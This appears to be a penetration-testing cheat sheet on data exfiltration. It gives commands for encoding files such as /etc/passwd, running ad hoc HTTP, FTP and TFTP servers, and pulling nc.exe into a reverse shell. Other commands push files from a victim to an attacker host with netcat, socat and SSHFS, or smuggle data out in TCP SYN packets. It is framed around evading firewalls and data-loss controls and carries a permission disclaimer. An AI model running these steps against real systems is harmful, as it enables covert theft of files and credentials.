# Data Exfiltration

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.‌
{% endhint %}

{% hint style="danger" %}
Not much here yet...please feel free to contribute at [my GitHub page](https://github.com/zweilosec/Infosec-Notes).
{% endhint %}

The first step to exfiltration is to avoid being caught.  This means avoiding firewalls, data loss prevention, email filters, and more.  Encoding/encrypting your payload is a good way to do this.

## Preparing files for transport

{% tabs %}
{% tab title="base64" %}
Base64 encode a file

```bash
base64 -w0 $file
```

Base64 decode a file

```bash
base64 -d $file
```
{% endtab %}

{% tab title="uuencode" %}
Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).

Encode:

```
$ uuencode /etc/passwd passwd-COPY
begin 644 passwd-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```

Cut & paste the output (4 lines, starting with 'begin 644 filename') into `uudecode` to decode:

```
$ uudecode
begin 644 passwd-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```
{% endtab %}

{% tab title="openssl" %}
Openssl can also be used to encode files for transport

Encode:

```
$ openssl base64 < /etc/passwd
```

Cut & paste the output then transfer and decode:

```
$ openssl base64 -d > passwd-COPY
```
{% endtab %}

{% tab title="xxd" %}
You can also use `xxd` to hex-encode files.

First encode with this command:

```
$ xxd -p < /etc/passwd
```

Cut & paste the output into this command: Decode:

```
$ xxd -p -r passwd-COPY
```
{% endtab %}

{% tab title="Compression" %}
### shar

Use `shar` to create a self-extracting shell script, which is in text format and can be copied/mailed:

* [https://linux.die.net/man/1/shar](https://linux.die.net/man/1/shar)

```
shar *.py *.c > exfil.shar
```

Transfer _**exfil.shar**_ to the remote system by any means and execute it:

```
chmod +x exfil.shar
./exfil.shar
```

###

### tar

A tar file is similar to a standard zip archive

```
tar cfz - *.py *.c | openssl base64 > exfil.tgz.b64
```

Transfer _exfil.tgz.b64_ to the remote system and decode:

```
openssl base64 -d < exfil.tgz.b64 | tar xfz -
```
{% endtab %}
{% endtabs %}

## HTTP/HTTPS

One of the easier ways to transfer a file as most devices have web access. Start by finding a directory on the target that you can write to.

```
# find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
```

```
# wget http://<url> -O url.txt -o /dev/null
```

Curl has the benefit of being able to transfer with IMAP, POP3, SCP, SFTP, SMB, SMTP, TELNET, TFTP< and other protocols. Experimentation may be needed to figure out what is blocked/allowed by the firewall.

```
# curl -o file.txt http://url.com
```

### Scripted HTTP Servers

```
python2 -m SimpleHTTPServer $port
python3 -m http.server $port
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:8888
```

[SimpleHTTPServerWithUpload](https://gist.github.com/UniIsland/3346170)

```
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

## FTP

{% tabs %}
{% tab title="Python" %}
### Python FTP server

```bash
#!/usr/bin/env python3


##Author : Paranoid Ninja
#Modified: Zweilos
##Descr  : Creates a Simple FTP Server in the tmp directory

from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

FTP_PORT = 2121
FTP_USER = "ninja"
FTP_PASSWORD = "ninja"
FTP_DIRECTORY = "."


def main():
    dir = input("Run in the current directory? [y/n]\n")
    if (dir != "y") or (dir != "Y"):
        FTP_DIRECTORY = input("Please enter a directory:")

    authorizer = DummyAuthorizer()
    authorizer.add_user(FTP_USER, FTP_PASSWORD, FTP_DIRECTORY, perm='elradfmw')

    handler = FTPHandler
    handler.authorizer = authorizer
    handler.banner = "Ninja FTP Server"

    address = ('', FTP_PORT)
    server = FTPServer(address, handler)

    server.max_cons = 256
    server.max_cons_per_ip = 5

    server.serve_forever()


if __name__ == '__main__':
    main()
```

You can also use the pyftplib module to quickly and easily set up ftp

```
#pip3 install pyftpdlib
#python3 -m pyftpdlib -p 21
```
{% endtab %}

{% tab title="NodeJS" %}
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
{% endtab %}

{% tab title="Pure-FTP" %}
```
# sudo apt update && sudo apt install pure-ftpd
```

Config Script

```
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
{% endtab %}
{% endtabs %}

## TFTP

Install the TFTP client

```bash
sudo apt update && sudo apt install atftp
```

Download with TFTP

```bash
# In Kali 
atftpd --daemon --port 69 /tftp

# In reverse shell
tftp -i 10.10.10.10 GET nc.exe
```

Upload with TFTP

```
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
tftp -i 10.11.0.4 put exfil.zip
```

## SCP

SCP tranfsers files through SSH See [SCP section](../../os-agnostic/ssh-and-scp.md#scp) for more.

```
Get file
# scp user@<remoteip>:/tmp/file /tmp/file

Put file
# scp /tmp/file user@<remoteIP>:/tmp/file
```

## NetCat from target

```bash
#start listener to recieve file
nc -nvlp 55555 > file
#send file to listening system
nc $target_ip 55555 < file
```

## Python HTTP server script

TODO: add --help to python file sharing scripts (issue [#14](https://github.com/zweilosec/Infosec-Notes/issues/14))

* Add argument parsing capability
* add `--help` argument for getting usage description
* add arguments for all user input variables
* FTP Server script has hardcoded values that need to be replaceable

Script for listing and sharing files in a folder. Uses python3's `http.server` module.

```bash
#!/bin/bash

#Makes different colored text
GN="\e[32m"
RES="\e[0m"
CYAN="\e[1;36m"

#font=Big http://www.patorjk.com/software/taag/
echo -e "\n$CYAN""
  _____       _   _                   ______ _ _       _____                          
 |  __ \     | | | |                 |  ____(_) |     / ____|                         
 | |__) |   _| |_| |__   ___  _ __   | |__   _| | ___| (___   ___ _ ____   _____ _ __ 
 |  ___/ | | | __| '_ \ / _ \| '_ \  |  __| | | |/ _ \\___ \ / _ \ '__\ \ / / _ \ '__|
 | |   | |_| | |_| | | | (_) | | | | | |    | | |  __/____) |  __/ |   \ V /  __/ |   
 |_|    \__, |\__|_| |_|\___/|_| |_| |_|    |_|_|\___|_____/ \___|_|    \_/ \___|_|   
         __/ |                                                                        
        |___/                                                                         
$RES"
echo -e "Created By$GN Ac1d $RES\n"
echo -e "Updated by$CYAN zweilos $RES\n"

#list IPs associated with current hostname
HN="hostname -I"
#put the IPs into a list
res=$(eval $HN)
arrIN=(${res// / })
IP=""

#if there is more than one IP available, list the first two as options
#TODO: make a way to list all options
if [ ${#arrIN[@]} -gt 1 ]; then
        PS3='Which IP address?: '
        options=("${arrIN[0]}" "${arrIN[1]}" "Quit")
        select opt in "${options[@]}"
        do
        case $opt in
                "${arrIN[0]}")
                        IP="${arrIN[0]}"
                        break
                ;;

                "${arrIN[1]}")
                        IP="${arrIN[1]}"
                        break
                ;;
                "Quit")
                break
                ;;
                *) echo "Invalid option: $REPLY";;
        esac
        done
else
       IP=$arrIN

fi
echo ""
echo "IP: "$IP
echo ""
echo -e "File links...\n"
for entry in `ls`;do
        if  [  ! -d $entry  ];then
                wgetCmd=$(echo "wget http://${IP##*( )}:8099/$entry" | xargs)
                echo -e "\t$GN$wgetCmd$RES"
        fi
done
echo ""
echo -e "\nCurrent Directory Contents"
ls --color .
echo ""
echo -e "\nStarting Server"

python3 -m http.server 8099  -d .
```

## Other Programs

{% tabs %}
{% tab title="Socat" %}
### Socat

```bash
#to attacker
sudo socat TCP4-LISTEN:$port:fork file:$file_name
#from victim
socat TCP4:$IP:$port file:$filename,create
```

`sudo` is necessary if the port is under 1024. `fork` allows for multiple connections.
{% endtab %}

{% tab title="SSHFS" %}
### SSHFS

If the victim has SSH, the attacker can mount a directory from the victim to the attacker.

```bash
sudo apt install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
{% endtab %}
{% endtabs %}

## Data exfiltration using TCP SYN <a href="#h-data-exfiltration-using-tcp-syn" id="h-data-exfiltration-using-tcp-syn"></a>

We can use TCP SYN sequence number packets to exfiltrate data using the `syn-file` tool.

```bash
./syn-file -i eth0 -d 192.168.1.158 -f /etc/passwd -p 8080 -P 8081 -m 00:0C:0A:4a:3b:5ch
```

* [https://github.com/defensahacker/syn-file](https://github.com/defensahacker/syn-file)

## Resources

* [https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)
* [https://awakened1712.github.io/oscp/oscp-transfer-files/](https://awakened1712.github.io/oscp/oscp-transfer-files/)
* [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
* [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin-examples)
* [DNSFTP](https://github.com/breenmachine/dnsftp) - Get file with DNS requests
* [https://linuxhandbook.com/transfer-files-ssh/](https://linuxhandbook.com/transfer-files-ssh/)
* [https://xapax.github.io/security/#transferring\_files/transfering\_files/](https://xapax.github.io/security/#transferring\_files/transfering\_files/)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/)

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
